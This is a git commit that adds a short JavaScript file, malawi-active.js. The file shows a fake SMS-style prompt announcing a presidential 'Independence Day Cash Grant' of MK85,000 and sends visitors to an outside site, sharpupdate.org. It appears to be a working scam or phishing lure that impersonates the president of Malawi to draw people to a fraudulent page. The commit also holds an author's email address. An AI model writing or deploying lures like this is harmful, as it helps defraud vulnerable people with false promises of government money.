a91abb1f8e10e00a5dddc9cbb07ed3b322182683
ekperikpe <ekperikpe588@gmail.com>
2025-07-03 09:25:58 +0100

    Create malawi-active.js

---
+++ malawi-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW MK85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive MK85,000 Independence Day Celebration Cash Grant from the President, Press Ok to withdraw cash Now ','WITHDRAW MK85,000');
+if (password != 'WITHDRAW MK85,000') {
+location.href='https://sharpupdate.org/malawi.html';
+}
